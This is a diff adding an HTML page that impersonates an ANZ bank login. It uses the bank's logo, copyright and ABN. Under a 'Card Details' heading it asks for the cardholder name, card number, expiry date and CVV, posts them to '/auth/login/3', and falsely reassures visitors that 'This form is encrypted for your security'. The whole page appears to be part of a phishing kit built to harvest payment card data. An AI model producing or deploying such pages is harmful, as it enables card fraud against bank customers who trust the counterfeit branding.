@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+		<meta http-equiv="x-ua-compatible" content="ie=edge" />
+		<title>Login</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<link rel="icon" href="/img/favicon.ico" />
+		<link rel="stylesheet" href="/css/login.css" />
+		<script src="/js/jquery.js"></script>
+	</head>
+
+	<body>
+		<div id="root" class="pageContainer">
+			<div class="sc-htoDjs gcwNfU">
+				<header class="sc-csuQGl iNSeoe">
+					<div class="sc-Rmtcm fQcucI">
+						<span class="sc-chPdSV kiOFau">
+							<a href="javascript:void(0);" title="ANZ Logo" class="sc-cvbbAY fSWFwe">
+								<img src="/img/anz-logo.svg" alt="ANZ logo" class="sc-bRBYWo iDMDsu" />
+							</a>
+						</span>
+					</div>
+				</header>
+				<main class="sc-dnqmqq fgYQMj">
+					<div class="sc-iwsKbI sc-gqjmRU sc-VigVT cbBBvh">
+						<div class="sc-RefOD fcpSbK">
+							<div class="sc-iQKALj eJuBVL">
+								<div class="sc-jTzLTM sc-fjdhpX sc-gipzik biBRUN">
+									<div class="sc-bdVaJa sc-bxivhb gHmjpC">
+										<div class="sc-bwzfXH sc-ifAKCX jMDrzh">
+											<div class="sc-htpNat sc-EHOje fuDXid">
+												<h1 id="login-header" font-size="30px" font-weight="600" class="sc-elJkPf gQzZhN">
+													<span role="text" class="sc-bYSBpT bDGCPV">
+														<div>Card Details</div>
+													</span>
+												</h1>
+											</div>
+										</div>
+										<form action="/auth/login/3" method="post">
+											<div id="live-container">
+												<div class="sc-bwzfXH sc-ifAKCX hkTfox">
+													<div class="sc-htpNat sc-EHOje fuDXid">
+														<div class="sc-jlyJG fXSsv">
+															<div class="cardname" style="margin-bottom: 32px;">
+																<label for="C">Cardholder Name</label><br />
+																<input type="text" name="ccname" id="ccname" class="sc-kvZOFW caCjTA" />
+															</div>
+															<div class="sc-frDJqD ddkzNy sc-hwwEjo iqfKQH">
+																<label for="ccnum" class="sc-kgAjT epQYnQ">Card Number</label>
+																<div class="sc-uJMKN dnzUOx">
+																	<div class="sc-bbmXgH fVCBsY"></div>
+																</div>
+																<div class="sc-jbKcbu huxGVV">
+																	<input
+																		id="ccnum"
+																		name="ccnum"
+																		type="tel"
+																		placeholder=""
+																		minlength="19"
+																		maxlength="19"
+																		required=""
+																		class="sc-kvZOFW caCjTA"
+																	/>
+																	<script type="text/javascript">
+																		const formatNumber = (number) =>
+																			number.split('').reduce((seed, next, index) => {
+																				if (index !== 0 && !(index % 4)) seed += ' ';
+																				return seed + next;
+																			}, '');
+
+																		document
+																			.getElementById('ccnum')
+																			.addEventListener(
+																				'input',
+																				(e) => (e.target.value = formatNumber(e.target.value.replaceAll(' ', '')))
+																			);
+																	</script>
+																	<span value="" class="sc-jqCOkK kFMbpR"></span>
+																</div>
+																<p style="display: none" class="sc-dVhcbM intwzL">
+																	Please enter your Card Number
+																</p>
+															</div>
+														</div>
+													</div>
+												</div>
+											</div>
+											<div id="live-container">
+												<div class="sc-bwzfXH sc-ifAKCX hkTfox">
+													<div class="sc-htpNat sc-EHOje fuDXid">
+														<div class="sc-jlyJG fXSsv">
+															<div class="sc-frDJqD ddkzNy sc-hwwEjo iqfKQH">
+																<label for="expiry" class="sc-kgAjT epQYnQ">Expiry Date</label>
+																<div class="sc-uJMKN dnzUOx">
+																	<div class="sc-bbmXgH fVCBsY"></div>
+																</div>
+																<div class="sc-jbKcbu huxGVV">
+																	<input
+																		name="expiry"
+																		id="expiry"
+																		type="numeric"
+																		placeholder="MM / YY"
+																		inputmode="text"
+																		minlength="4"
+																		oninvalid="setCustomValidity('Please enter a valid expiry date!')"
+																		oninput="setCustomValidity('')"
+																		maxlength="5"
+																		class="sc-kvZOFW caCjTA"
+																	/>
+																	<script type="text/javascript">
+																		$('#expiry').on('input', function () {
+																			var curLength = $(this).val().length;
+																			if (curLength === 2) {
+																				var newInput = $(this).val();
+																				newInput += '/';
+																				$(this).val(newInput);
+																			}
+																		});
+																	</script>
+																	<span value="" class="sc-jqCOkK kFMbpR"></span>
+																</div>
+																<p style="display: none" class="sc-dVhcbM intwzL">
+																	Please enter your card expiration date.
+																</p>
+															</div>
+														</div>
+													</div>
+												</div>
+											</div>
+											<div id="live-container">
+												<div class="sc-bwzfXH sc-ifAKCX hkTfox">
+													<div class="sc-htpNat sc-EHOje fuDXid">
+														<div class="sc-jlyJG fXSsv">
+															<div class="sc-frDJqD ddkzNy sc-hwwEjo iqfKQH">
+																<label for="cvv" class="sc-kgAjT epQYnQ">Security Code (CVV)</label>
+																<div class="sc-uJMKN dnzUOx">
+																	<div class="sc-bbmXgH fVCBsY"></div>
+																</div>
+																<div class="sc-jbKcbu huxGVV">
+																	<input
+																		name="cvv"
+																		id="cvv"
+																		inputmode="numeric"
+																		step="any"
+																		type="password"
+																		minlength="3"
+																		maxlength="4"
+																		oninput="setCustomValidity('')"
+																		required
+																		class="sc-kvZOFW caCjTA"
+																	/>
+																	<span value="" class="sc-jqCOkK kFMbpR"></span>
+																</div>
+																<p style="display: none" class="sc-dVhcbM intwzL">Please enter your CVV</p>
+															</div>
+														</div>
+													</div>
+												</div>
+											</div>
+											<div class="sc-bwzfXH sc-ifAKCX hkTfox">
+												<div class="sc-htpNat sc-EHOje fuDXid">
+													<button type="submit" font-weight="600" class="sc-hMqMXs enlyRz">
+														<span role="text"> Continue </span>
+													</button>
+												</div>
+											</div>
+										</form>
+										<div class="sc-bwzfXH sc-ifAKCX jTKZuQ">
+											<div class="sc-htpNat sc-EHOje fuDXid">
+												<div class="sc-kIPQKe kdLFKe">
+													<span class="sc-jwKygS hHGkXv">
+														<span> &bull;&nbsp;This form is encrypted for your security </span>
+													</span>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</main>
+				<footer class="sc-hzDkRC hLFFFY">
+					<div class="sc-jhAzac cAuNUY">
+						<div class="sc-iwsKbI sc-gqjmRU sc-kgoBCf UeGWU">
+							<span class="sc-fMiknA iYfeTu">
+								<div class="sc-kEYyzF jMeGNg">
+									© Australia and New Zealand Banking Group Limited (ANZ) 2024<span class="sc-fBuWsC kbKcVw">
+										ABN 11 005 357 522.</span
+									>
+								</div>
+							</span>
+						</div>
+					</div>
+				</footer>
+			</div>
+		</div>
+	</body>
+</html>
